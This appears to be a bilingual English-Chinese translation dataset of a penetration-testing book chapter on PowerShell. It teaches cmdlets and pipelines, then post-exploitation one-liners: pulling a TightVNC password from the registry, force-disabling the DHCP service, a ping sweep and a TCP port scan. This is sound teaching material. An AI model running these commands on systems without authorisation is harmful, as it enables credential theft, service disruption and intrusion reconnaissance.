- en: '*Chapter 9*: PowerShell Fundamentals'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第 9 章*：PowerShell 基础'
- en: Windows – it’s the operating system you love to hate. Or is it hate to love?
    Either way, it’s a divisive one among security professionals. Tell a total layperson
    to walk into a security conference and simply complain about Windows and he’s
    in like Flynn. No matter your position, one thing we can be sure of is its power.
    The landscape of assessing Windows environments changed dramatically in 2006 when
    PowerShell appeared on the scene. Suddenly, an individual Windows host had a sophisticated
    task automation and administration framework built right into it.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: Windows——这是你既爱又恨的操作系统。或者说是恨又爱？无论如何，它在安全专家中存在分歧。让一个完全不懂的人走进一个安全会议，只需要抱怨 Windows，他就能轻松融入其中。无论你立场如何，有一点我们可以肯定，那就是它的强大。从
    2006 年 PowerShell 问世开始，评估 Windows 环境的方式发生了剧变。突然，一个单独的 Windows 主机就内置了一个复杂的任务自动化和管理框架。
- en: One of the important lessons of the post-exploitation activities in a penetration
    test is that we’re not always compromising a machine, nabbing the data out of
    it, and moving on; these days, even a low-value Windows foothold becomes an attack
    platform in its own right. One of the most dramatic ways to demonstrate this is
    by leveraging PowerShell from our foothold.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试中的后渗透活动所得到的重要教训之一是，我们并不总是在入侵一台机器，窃取其中的数据，然后离开；如今，即使是一个低价值的 Windows 控制点，也会成为一个独立的攻击平台。展示这一点的最戏剧性方式之一是通过利用我们在控制点上的
    PowerShell。
- en: 'In this chapter, we will cover the following topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下主题：
- en: Exploring PowerShell commands and the scripting language
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 探索 PowerShell 命令和脚本语言
- en: Understanding basic post-exploitation with PowerShell
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 理解 PowerShell 中的基本后渗透操作
- en: Introducing the PowerShell Empire framework
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 介绍 PowerShell Empire 框架
- en: Exploring listener, stager, and agent concepts in PowerShell Empire
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 探索 PowerShell Empire 中的监听器、预备阶段和代理概念
- en: Technical requirements
  id: totrans-8
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'The following are the operating system requirements for this chapter:'
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 本章的操作系统要求如下：
- en: Kali Linux
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux
- en: Windows 7 or 10
  id: totrans-11
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows 7 或 10
- en: Power to the shell – PowerShell fundamentals
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 给 shell 提供动力 – PowerShell 基础
- en: PowerShell is a command-line and scripting language framework for task automation
    and configuration management. I didn’t specify for Windows as, for a couple of
    years now, PowerShell has been cross-platform; however, it’s a Microsoft product.
    These days, it’s built into Windows, and despite its powerful potential for an
    attacker, it isn’t going to be fully blocked. For the Windows pen testers of today,
    it’s a comprehensive and powerful tool in their arsenal that just so happens to
    be installed on all of their victims’ PCs.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 是一个用于任务自动化和配置管理的命令行和脚本语言框架。我没有指定仅适用于 Windows，因为 PowerShell 已经是跨平台的，至今已有几年了；然而，它仍然是微软的产品。如今，它已经内置于
    Windows 中，尽管对攻击者具有强大的潜力，但它并不会被完全封锁。对于今天的 Windows 渗透测试人员来说，它是他们武器库中一项全面且强大的工具，恰好也安装在所有受害者的电脑上。
- en: What is PowerShell?
  id: totrans-14
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 什么是 PowerShell？
- en: PowerShell can be a little overwhelming to understand when you first meet it,
    but ultimately, it’s just a fancy interface. PowerShell interfaces with providers,
    which allows you to access functionality that can’t easily be leveraged at the
    command line. In a way, they’re like hardware drivers – code that provides a way
    for software and hardware to communicate. Providers allow us to communicate with
    functionality and components of Windows from the command line.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 当你第一次接触 PowerShell 时，它可能让人感觉有些压倒性，但归根结底，它只是一个花哨的界面。PowerShell 通过提供者与外部功能进行交互，允许你访问那些在命令行中无法轻易利用的功能。从某种程度上来说，它们就像硬件驱动程序——代码，它们为软件和硬件之间的通信提供了途径。提供者使我们能够通过命令行与
    Windows 的功能和组件进行通信。
- en: 'When I described PowerShell as a task automation and configuration management
    framework, that’s more along the lines of Microsoft’s definition of PowerShell.
    As hackers, we think of what things can do, not necessarily how their creators
    defined them; in that sense, PowerShell is the Windows command line on steroids.
    It can do anything you’re used to doing in the standard Windows command shell.
    For example, fire up PowerShell and try using a good old-fashioned **ipconfig**
    command, as shown in the following screenshot:'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 当我将 PowerShell 描述为任务自动化和配置管理框架时，这更符合微软对 PowerShell 的定义。作为黑客，我们关注的是这些工具能做什么，而不一定是它们的创造者如何定义它们；从这个角度来看，PowerShell
    就是经过增强的 Windows 命令行。它可以做任何你在标准 Windows 命令行中做的事情。例如，启动 PowerShell 并尝试使用传统的 **ipconfig**
    命令，如下图所示：
- en: '![Figure 9.1 – PowerShell can do everything CMD can do ](image/Figure_9.1_B17616.jpg)'
  id: totrans-17
  prefs: []
  type: TYPE_IMG
  zh: '![图9.1 – PowerShell能做CMD能做的一切](image/Figure_9.1_B17616.jpg)'
- en: Figure 9.1 – PowerShell can do everything CMD can do
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.1 – PowerShell能做CMD能做的一切
- en: This works just fine. Now that we know what PowerShell lets us keep doing, let’s
    take a look at what makes it special.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 这完全没有问题。现在我们知道PowerShell允许我们继续执行的操作，让我们看看它的独特之处。
- en: 'For one, the standard Windows CMD is purely a Microsoft creation. Sure, the
    concept of a command shell isn’t unique to Windows, but how it’s implemented is
    unique as Windows has always done things in its own way. PowerShell, on the other
    hand, takes some of the best ideas from other shells and languages and brings
    them together. Have you ever spent a lot of time in Linux, and then accidentally
    typed **ls** instead of **dir** inside the Windows command line? What happens
    in PowerShell? Let’s see:'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，标准的Windows CMD完全是微软的创作。虽然命令行外壳的概念并非Windows独有，但它的实现方式是独特的，因为Windows一直以来都以自己的方式做事。另一方面，PowerShell吸取了其他外壳和语言中的一些最佳思想，并将它们结合在一起。你是否曾在Linux中花了很多时间，然后不小心在Windows命令行中输入了**ls**而不是**dir**？那PowerShell会发生什么呢？让我们看看：
- en: '![Figure 9.2 – Comparing dir with ls ](image/Figure_9.2_B17616.jpg)'
  id: totrans-21
  prefs: []
  type: TYPE_IMG
  zh: '![图9.2 – 比较dir和ls](image/Figure_9.2_B17616.jpg)'
- en: Figure 9.2 – Comparing dir with ls
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.2 – 比较dir和ls
- en: 'That’s right – the **ls** command works in PowerShell, alongside the old-school
    **dir** and PowerShell’s **Get-ChildItem**. Let’s look closer at PowerShell’s
    native way of doing things: cmdlets.'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 没错——**ls**命令在PowerShell中也能使用，同时也有老式的**dir**和PowerShell的**Get-ChildItem**。让我们更深入地了解PowerShell原生的做法：cmdlet。
- en: PowerShell’s cmdlets and the PowerShell scripting language
  id: totrans-24
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: PowerShell的cmdlet和PowerShell脚本语言
- en: 'I had your attention when we talked about **ls** and **dir**, but you may have
    raised an eyebrow at **Get-ChildItem**. It sounds like something I’d put on my
    shopping list to remind myself to get a dinosaur toy for my kids (they’re really
    into dinosaurs right now). It’s one of PowerShell’s special ways of running commands
    called **commandlets** (**cmdlets**). A cmdlet is just a command, at least conceptually;
    behind the scenes, they’re .NET classes for implementing particular functionality.
    They’re the native bodies of commands within PowerShell and they use a unique
    self-explanatory syntax style: *verb-noun*. Before we go any further, let’s get
    familiar with the most important cmdlet of them all – **Get-Help**:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们谈论**ls**和**dir**时，我已经引起了你的注意，但你可能会对**Get-ChildItem**感到疑惑。它听起来像是我会在购物清单上写的一项提醒自己给孩子们买恐龙玩具的事项（他们现在真的很喜欢恐龙）。它是PowerShell的一种特殊命令方式，叫做**命令小工具**（**cmdlets**）。cmdlet实际上只是一个命令，至少从概念上来说；在背后，它们是实现特定功能的.NET类。它们是PowerShell中原生的命令实体，使用一种独特的自解释语法风格：*动词-名词*。在我们继续之前，让我们先熟悉一下最重要的cmdlet——**Get-Help**：
- en: '![Figure 9.3 – The Get-Help cmdlet is always by your side ](image/Figure_9.3_B17616.jpg)'
  id: totrans-26
  prefs: []
  type: TYPE_IMG
  zh: '![图9.3 – Get-Help cmdlet始终伴随左右](image/Figure_9.3_B17616.jpg)'
- en: Figure 9.3 – The Get-Help cmdlet is always by your side
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.3 – Get-Help cmdlet始终伴随左右
- en: 'By punching in **Get-Help [***cmdlet name***]**, you’ll find detailed information
    on the cmdlet, including example usage. The best part? It supports wildcards.
    Try using **Get-Help Get*** and note the following:'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 只需输入**Get-Help [***cmdlet 名称***]**，你就能找到关于该cmdlet的详细信息，包括示例用法。最棒的是？它支持通配符。尝试使用**Get-Help
    Get***并注意以下几点：
- en: '![Figure 9.4 – Wildcards with cmdlets ](image/Figure_9.4_B17616.jpg)'
  id: totrans-29
  prefs: []
  type: TYPE_IMG
  zh: '![图9.4 – 使用通配符与cmdlet](image/Figure_9.4_B17616.jpg)'
- en: Figure 9.4 – Wildcards with cmdlets
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 图9.4 – 使用通配符与cmdlet
- en: '**Get-Help** is pretty powerful, and we’re only scratching the surface. Now
    that we know how to get help along the way, let’s try some basic work with the
    Windows Registry.'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: '**Get-Help**功能非常强大，我们现在只是触及了皮毛。现在我们知道如何在过程中获取帮助，让我们尝试一些关于Windows注册表的基本操作。'
- en: Working with the Windows Registry
  id: totrans-32
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 使用Windows注册表
- en: 'Let’s work with a **Get** cmdlet to nab some data from the registry, and then
    convert it into a different format for our use. It just so happens that the machine
    I’ve attacked is running the TightVNC server, which stores an encrypted copy of
    the control password in the registry. This encryption is notoriously crackable,
    so let’s use PowerShell exclusively to grab the password in hexadecimal format,
    as follows:'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们使用**Get** cmdlet从注册表中获取一些数据，然后将其转换为不同的格式供我们使用。巧合的是，我攻击的这台机器正在运行TightVNC服务器，它在注册表中存储了控制密码的加密副本。这种加密方式众所周知可以轻松破解，因此我们将仅使用PowerShell以十六进制格式获取密码，如下所示：
- en: $FormatEnumerationLimit = -1
  id: totrans-34
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $FormatEnumerationLimit = -1
- en: Get-ItemProperty -Path registry::hklm\software\TightVNC\Server -Name ControlPassword
  id: totrans-35
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Get-ItemProperty -Path registry::hklm\software\TightVNC\Server -Name ControlPassword
- en: $password = 139, 16, 57, 246, 188, 35, 53, 209
  id: totrans-36
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $password = 139, 16, 57, 246, 188, 35, 53, 209
- en: ForEach ($hex in $password) {
  id: totrans-37
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ForEach ($hex in $password) {
- en: '>> [Convert]::ToString($hex, 16) }'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: '>> [Convert]::ToString($hex, 16) }'
- en: Let’s examine what we did here. First, I set the **$FormatEnumerationLimit**
    global variable to **-1**. As an experiment, try extracting the password without
    setting this variable first – what happens? The password gets cut off after 3
    bytes. You can set **$FormatEnumerationLimit** to define how many bytes are displayed,
    with the default intention being space-saving. Setting it to **-1** is effectively
    saying *no limit*.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看我们在这里做了什么。首先，我将**$FormatEnumerationLimit**全局变量设置为**-1**。作为实验，尝试在没有设置此变量的情况下提取密码——会发生什么？密码在
    3 个字节后被截断。你可以设置**$FormatEnumerationLimit**来定义显示多少字节，默认情况下是节省空间。将其设置为**-1**实际上是说*无限制*。
- en: 'Next, we must issue the **Get-ItemProperty** cmdlet to extract the value from
    the registry. Note that we can use **hklm** as an alias for **HKEY_LOCAL_MACHINE**.
    Without **-Name**, it will display all of the values in the **Server** key. PowerShell
    will show us the properties of the requested item:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们必须执行**Get-ItemProperty** cmdlet从注册表中提取值。请注意，我们可以使用**hklm**作为**HKEY_LOCAL_MACHINE**的别名。如果没有**-Name**参数，它将显示**Server**键中的所有值。PowerShell将显示我们请求的项的属性：
- en: '![Figure 9.5 – Converting the decimal array into hex ](image/Figure_9.5_B17616.jpg)'
  id: totrans-41
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.5 – 将十进制数组转换为十六进制](image/Figure_9.5_B17616.jpg)'
- en: Figure 9.5 – Converting the decimal array into hex
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.5 – 将十进制数组转换为十六进制
- en: 'At this point, our job is technically complete – we wanted the **ControlPassword**
    value, and now we have it. There’s just one problem: the bytes are in base-10
    (decimal). This is human-friendly, but not binary-friendly, so let’s convert the
    password with PowerShell. (Hey, we’re already here.) First, set a **$password**
    variable and separate the raw decimal values with commas. This tells PowerShell
    that you’re declaring an array. For fun, try setting the numbers inside quotation
    marks – what happens? The variable will then become a string with your numbers
    and commas, and **ForEach** is only going to see one item. Speaking of **ForEach**,
    that cmdlet is our last step – it defines a **for-each** loop (I told you these
    cmdlet names were self-explanatory) to conduct an operation on each item in the
    array. In this case, the operation is converting each value into base-16.'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 到目前为止，我们的工作从技术上讲已经完成——我们需要的是**ControlPassword**值，现在我们已经得到了它。只是有一个问题：这些字节是以十进制（decimal）表示的。这对人类友好，但对二进制不友好，所以让我们用PowerShell将密码转换一下。（嘿，我们已经在这里了。）首先，设置一个**$password**变量，并用逗号分隔原始的十进制值。这告诉PowerShell你正在声明一个数组。为了好玩，尝试将数字放入引号中——会发生什么？此时，变量将变成一个包含你的数字和逗号的字符串，而**ForEach**只会看到一个项。说到**ForEach**，这个cmdlet就是我们的最后一步——它定义了一个**for-each**循环（我早就告诉你这些cmdlet的名称很容易理解），用于对数组中的每一项进行操作。在这个例子中，操作就是将每个值转换为十六进制。
- en: This is just one small example. PowerShell can be used to manipulate anything
    in the Windows operating system, including files and services. Remember that PowerShell
    can do anything the GUI can.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 这只是一个小例子。PowerShell可以用来操作Windows操作系统中的任何东西，包括文件和服务。记住，PowerShell能做任何GUI能够做的事。
- en: Pipelines and loops in PowerShell
  id: totrans-45
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: PowerShell中的管道和循环
- en: As I mentioned previously, PowerShell has the DNA of the best shells. You can
    dive right in with the tricks of the trade you’re already used to. Piping command
    output into a **for** loop? That’s kid’s stuff.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 如我之前所提到的，PowerShell继承了最强大的shell的基因。你可以直接使用你已经熟悉的技巧。将命令输出管道到**for**循环？那对孩子们来说是小菜一碟。
- en: 'Take our previous example: we ended up with an array of decimal values and
    we need to convert each one into a hex. It should be apparent to even beginner
    programmers that this is an ideal **for** loop situation (for instance, **ForEach**
    in PowerShell). What’s great about pipelining in PowerShell is that you can pipe
    the object coming out of a cmdlet into another cmdlet, including **ForEach**.
    In other words, you can execute a cmdlet that outputs a list that is then piped
    into a **for** loop. Life is made even simpler with the single character alias
    for the **ForEach** cmdlet: **%**. Let’s take a look at an example. Both of these
    lines do the same thing:'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 以我们之前的例子为例：我们得到了一个十进制值的数组，我们需要将每个值转换为十六进制。即使是初学者程序员也应该能明显看出这是一个理想的 **for** 循环场景（例如
    PowerShell 中的 **ForEach**）。PowerShell 中管道的妙处在于，你可以将一个 cmdlet 输出的对象管道到另一个 cmdlet，包括
    **ForEach**。换句话说，你可以执行一个输出列表的 cmdlet，然后将该列表管道到 **for** 循环中。通过 **ForEach** cmdlet
    的单字符别名 **%**，生活变得更简单了。来看个例子，这两行代码做的是相同的事情：
- en: ls *.txt | ForEach-Object {cat $_}
  id: totrans-48
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ls *.txt | ForEach-Object {cat $_}
- en: ls *.txt | % {cat $_}
  id: totrans-49
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ls *.txt | % {cat $_}
- en: If executed in a path with more than one text file, the **ls *.txt** command
    will produce a list of results; these are the input for **ForEach-Object**, with
    each item represented as **$_**.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 如果在包含多个文本文件的路径中执行，**ls *.txt** 命令将产生一个结果列表，这些结果将作为 **ForEach-Object** 的输入，每个项目都表示为
    **$_**。
- en: There is technically a distinction between a **for** loop and a **for-each**
    loop, with the latter being a kind of **for** loop. A standard **for** loop essentially
    executes code a defined number of times, whereas the **for each** loop executes
    code for each item in an array or list.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 从技术上讲，**for** 循环和 **for-each** 循环之间是有区别的，后者是一种特殊的 **for** 循环。标准的 **for** 循环基本上会执行定义次数的代码，而
    **for each** 循环则会对数组或列表中的每个项目执行代码。
- en: 'We can define a number range with two periods (**..**). For example, **5..9**
    says to PowerShell, **5, 6, 7, 8, 9**. With this simple syntax, we can pipe ranges
    of numbers into a for loop this is handy for doing a task a set number of times,
    or even for using those numbers as arguments for a command. (I think I hear the
    hacker in you now – *we could make a PowerShell port scanner, couldn''t we?* Come
    on, don’t spoil the surprise. Keep reading.) So, by piping a number range into
    **ForEach**, we can work with each number as **$_**. What do you think will happen
    if we run this command? Let’s see:'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以用两个句点 (**..**) 定义一个数字范围。例如，**5..9** 告诉 PowerShell，**5, 6, 7, 8, 9**。通过这个简单的语法，我们可以将数字范围管道到
    **for** 循环中，这对于做一个固定次数的任务非常方便，甚至可以将这些数字用作命令的参数。（我觉得我听到你内心的黑客在说——*我们可以做一个 PowerShell
    端口扫描器，是不是？* 来吧，别剧透了。继续往下读。）因此，通过将数字范围管道到 **ForEach**，我们可以将每个数字作为 **$_** 来处理。如果我们运行这个命令，你觉得会发生什么？让我们看看：
- en: 1..20 | % {echo "Hello, world! Here is number $_!"}
  id: totrans-53
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 1..20 | % {echo "你好，世界！这是第 $_ 个！"}
- en: 'Naturally, we can build pipelines – a series of cmdlets passing output down
    the chain. For example, check out the following command:'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: 自然地，我们可以构建管道 —— 一系列的 cmdlet 将输出传递到下游。例如，看看下面这个命令：
- en: Get-Service Dhcp | Stop-Service -PassThru -Force | Set-Service -StartupType
    Disabled
  id: totrans-55
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Get-Service Dhcp | Stop-Service -PassThru -Force | Set-Service -StartupType
    Disabled
- en: Note that by defining the **Dhcp** service in the first cmdlet in the pipeline,
    **Stop-Service** and **Set-Service** already know what we’re working with.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，通过在管道中的第一个 cmdlet 中定义 **Dhcp** 服务，**Stop-Service** 和 **Set-Service** 已经知道我们正在处理的内容。
- en: I can hear you shouting from the back, “*what about an interactive scripting
    environment for more serious development?*” Say no more.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 我听到你从后面喊：“*那对于更严肃的开发来说，有没有交互式脚本环境？*” 不用担心，我来告诉你。
- en: It gets better – PowerShell’s ISE
  id: totrans-58
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 更棒的是 —— PowerShell 的 ISE
- en: One of the coolest things about PowerShell is the **interactive scripting environment**
    (**ISE**) that is built into the whole package. It features an interactive shell
    where you can run commands as you would in a normal shell session, as well as
    a coding window with syntax awareness and debugging features.
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 最酷的功能之一是内置的 **交互式脚本环境** (**ISE**)，它包含了一个交互式外壳，你可以像在正常的 shell 会话中一样运行命令，同时还有一个具有语法意识和调试功能的编码窗口。
- en: 'You can write up, test, and send scripts just like in any other programming
    experience:'
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以像在任何其他编程环境中一样，编写、测试并发送脚本：
- en: '![Figure 9.6 – Windows PowerShell ISE ](image/Figure_9.6_B17616.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.6 – Windows PowerShell ISE](image/Figure_9.6_B17616.jpg)'
- en: Figure 9.6 – Windows PowerShell ISE
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.6 – Windows PowerShell ISE
- en: The file extension for any PowerShell script you write is **ps1**. Unfortunately,
    not all PowerShell installations are the same, and different versions of PowerShell
    have some differences; keep this in mind when you hope to run the **ps1** file
    you wrote on a given host.
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 你编写的任何 PowerShell 脚本文件的扩展名都是 **ps1**。不幸的是，并不是所有的 PowerShell 安装都相同，不同版本的 PowerShell
    之间存在一些差异；当你希望在某个主机上运行你编写的 **ps1** 文件时，请记住这一点。
- en: This was a pleasant introduction to PowerShell basics, but now, we need to start
    understanding how PowerShell will be one of your favorite tools in your hacking
    bag.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 这是对 PowerShell 基础知识的愉快介绍，但现在，我们需要开始理解 PowerShell 如何成为你黑客工具包中最喜爱的工具之一。
- en: Post-exploitation with PowerShell
  id: totrans-65
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: PowerShell 后期利用
- en: PowerShell is a full Windows administration framework, and it’s built into the
    operating system. It can’t be completely blocked. When we talk about post-exploitation
    in Windows environments, consideration of PowerShell is not a nice-to-have – it’s
    a necessity. We’ll examine the post phase in more detail in the last two chapters
    of this book, but for now, let’s introduce PowerShell’s role in bringing our attack
    to the next stage and one step closer to total compromise.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: PowerShell 是一个完整的 Windows 管理框架，并且它是内置在操作系统中的，无法完全被阻止。当我们谈论 Windows 环境中的后期利用时，考虑到
    PowerShell 是必不可少的—它不是一个锦上添花的工具，而是一个必须具备的工具。我们将在本书的最后两章中更详细地探讨后期阶段，但现在，让我们先介绍一下
    PowerShell 在将我们的攻击推进到下一个阶段，并一步步接近完全控制中的作用。
- en: ICMP enumeration from a pivot point with PowerShell
  id: totrans-67
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 从 Pivot 点进行 ICMP 枚举与 PowerShell
- en: So, you have your foothold on a Windows 7 or 10 box. Setting aside the possibility
    of uploading our tools, can we use a plain off-the-shelf copy of Windows 7 or
    10 to poke around for a potential next stepping stone? With PowerShell, there
    isn’t much we can’t do.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，你已经在 Windows 7 或 10 的系统上获取了一个立足点。抛开上传工具的可能性，我们能否利用一个普通的 Windows 7 或 10 系统，寻找潜在的下一个突破点？通过
    PowerShell，几乎没有什么我们做不到的事情。
- en: 'As we mentioned earlier, we can pipe a number range into **ForEach**. So, if
    we’re on a network with a netmask of **255.255.255.0**, our range could be 1 through
    255 piped into a **ping** command. Let’s see it in action:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们之前提到的，我们可以将一系列数字传递给 **ForEach**。比如，如果我们在一个子网掩码为 **255.255.255.0** 的网络中，我们的范围可以是从
    1 到 255，然后将这些数字传递给 **ping** 命令。让我们来看一下实际操作：
- en: 1..255 | % {echo "192.168.63.$_"; ping -n 1 -w 100 192.168.63.$_ | Select-String
    ttl}
  id: totrans-70
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 1..255 | % {echo "192.168.63.$_"; ping -n 1 -w 100 192.168.63.$_ | Select-String
    ttl}
- en: 'As you can see, this will find results with the **ttl** string and thus, responses
    to the ping request:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，这将查找带有 **ttl** 字符串的结果，从而响应 ping 请求：
- en: '![Figure 9.7 – The quick ping sweeper ](image/Figure_9.7_B17616.jpg)'
  id: totrans-72
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.7 – 快速 ping 扫描器 ](image/Figure_9.7_B17616.jpg)'
- en: Figure 9.7 – The quick ping sweeper
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.7 – 快速 ping 扫描器
- en: 'Let’s stroll down the pipeline. First, we define a range of numbers: an inclusive
    array from 1 to 255\. This is input to the **ForEach** alias, **%**, where we
    run an **echo** command and a **ping** command, using the current value in the
    loop as the last decimal octet for the IP address. As you already know, **ping**
    returns status information; this output is piped further down to **Select-String**
    to grep out the **ttl** string since this is one way of knowing we have a hit
    (we won’t see a TTL value unless a host responded to the ping request). Voilà
    – a PowerShell ping sweeper. It’s slow and crude, but we work with what is presented
    to us.'
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们沿着管道继续往下走。首先，我们定义一个数字范围：一个从 1 到 255 的闭区间数组。这个数组作为输入传递给 **ForEach** 别名 **%**，然后我们运行一个
    **echo** 命令和一个 **ping** 命令，使用循环中的当前值作为 IP 地址的最后一个十进制八位数。正如你已经知道的，**ping** 返回状态信息；这个输出被进一步传递给
    **Select-String**，用于提取 **ttl** 字符串，因为这是知道我们是否有命中响应的一种方式（只有主机响应了 ping 请求，我们才能看到
    TTL 值）。瞧—这是一个 PowerShell ping 扫描器。虽然它很慢且粗糙，但我们只能使用手头的工具。
- en: You might be wondering that if we have access to fire off PowerShell, why don’t
    we have access to a Meterpreter session and/or upload a toolset? Maybe, but maybe
    not – perhaps we have VNC access after cracking a weak password, but that isn’t
    a system compromise or presence on the domain. Another possibility is the insider
    threat – someone left a workstation open, we snuck up and sat down at their keyboard,
    and one of the few things we have time for is firing off a PowerShell one-liner.
    The pen tester must always maintain flexibility and keep an open mind.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能会想，如果我们可以启动 PowerShell，为什么我们就不能拥有 Meterpreter 会话或者上传工具集？也许可以，但也可能不行—或许我们是通过破解一个弱密码获得
    VNC 访问权限的，但这并不等于系统被完全控制或者出现在域中。另一个可能性是内部威胁—可能某人忘记锁定工作站，我们偷偷走过去坐下，能做的其中一件事就是执行一个
    PowerShell 一行代码。渗透测试员必须始终保持灵活性，并保持开放的思维。
- en: You can imagine the next step after a ping sweep – looking for open ports, right
    from our PowerShell session.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以想象，在完成 ping 扫描后，下一步就是寻找开放端口，直接在 PowerShell 会话中进行。
- en: PowerShell as a TCP-connect port scanner
  id: totrans-77
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: PowerShell 作为 TCP 连接端口扫描器
- en: 'Now that we have a host in mind, we can learn more about it with the following
    one-liner, which is designed to attempt TCP connections to all specified ports:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经有了目标主机，我们可以使用以下一行命令进一步了解它，这个命令旨在尝试连接所有指定的端口：
- en: 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.63.147",
    $_)) "Open port - $_"} 2>$null
  id: totrans-79
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.63.147",
    $_)) "开放端口 - $_"} 2>$null
- en: 'Let’s see what this would look like after we do a quick ping sweep of a handful
    of hosts:'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看在快速扫描少数几个主机后会是什么样子：
- en: '![Figure 9.8 – The PowerShell port scan ](image/Figure_9.8_B17616.jpg)'
  id: totrans-81
  prefs: []
  type: TYPE_IMG
  zh: '![图 9.8 – PowerShell 端口扫描](image/Figure_9.8_B17616.jpg)'
- en: Figure 9.8 – The PowerShell port scan
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 图 9.8 – PowerShell 端口扫描
- en: As you can see, this is just taking the basics we’ve learned about to the next
    level. **1..1024** defines our port range and pipes the array into **%**; with
    each iteration, a TCP client module is brought up to attempt a connection on the
    port. **2>$null** blackholes **STDERR**; in other words, a returned error means
    the port isn’t open and the response is thrown in the trash.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，这只是将我们所学的基础知识提升到下一个层次。**1..1024** 定义了我们的端口范围，并将数组传递到 **%**；每次迭代时，都会启动一个
